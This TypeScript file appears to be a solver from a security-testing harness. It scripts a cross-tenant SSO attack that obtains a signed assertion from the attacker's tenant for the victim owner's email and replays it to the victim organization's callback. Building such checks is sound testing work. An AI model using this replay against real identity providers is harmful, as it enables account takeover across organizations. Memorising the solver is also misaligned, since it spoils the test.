// Two-step federated sign-in attempt: obtain a correctly signed assertion for the attacker's
// provider tenant, then present it to the victim organization's callback.
import type { SolverCtx } from '../../../../lib/types.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const start = ctx.plan.routes.ssoStart
  const callback = ctx.plan.routes.ssoCallback
  if (!start || !callback) return
  const victim = ctx.plan.domain.tenants.orgA
  const attacker = ctx.plan.domain.tenants.orgB
  const email = ctx.persona('owner_a').email

  const query = new URLSearchParams({ email, org: attacker }).toString()
  const issued = await ctx.request({ method: start.method, path: `${start.path}?${query}` })
  const payload = issued.json<{ assertion?: Record<string, unknown> }>()
  if (!payload.assertion) return
  const assertion = JSON.stringify(payload.assertion)

  await ctx.request({
    method: callback.method,
    path: callback.path,
    headers: { 'content-type': 'application/json' },
    body: { assertion, org: victim },
  })
}
